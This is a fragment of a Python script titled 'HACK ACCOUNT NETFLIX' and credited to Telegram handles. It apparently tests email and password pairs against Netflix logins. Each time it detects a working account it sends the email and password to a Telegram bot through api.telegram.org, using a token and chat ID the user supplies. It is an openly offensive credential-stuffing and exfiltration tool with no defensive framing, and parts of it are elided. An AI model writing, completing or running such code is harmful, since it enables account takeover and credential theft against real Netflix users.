...
G = '\033[1;32m'
S = '\033[1;33m'
Print=(E+'HACK ACCOUNT NETFLIX'+G+'\nBY : @TFT_MAHDY'+S+'\nCH:@AR_PROGRAMMERS'+G+'\n~~~~~~~~~~~~~~~~~~~~~~~~~')
print(Print)
token=input(S+'TOKEN:')
ID=input(S+'ID:')
os.system('clear')
print(Print)
n_n=int(input(G+'SLEEP TIME:'))
os.system('clear')
while True:
  ...
  if '"memberHome"' in Go.text:
  	...
  	tlg =requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=NEW PREMIUM ACCOUNT NETFLIX\n EMAIL : {ema}\nPASSWORD : {password}\nBY: @TFT_MAHDY | CH : @AR_PROGRAMMERS''')
  	...
  	tlg =requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=NEW FREE ACCOUNT NETFLIX\n EMAIL : {ema}\nPASSWORD : {password}\nBY: @TFT_MAHDY | CH : @AR_PROGRAMMERS''')
  elif 'unrecognized_email' in Go.text:
      print(f'{E}[×] الايميل خطأ==> {ema} | {password}')
  else:
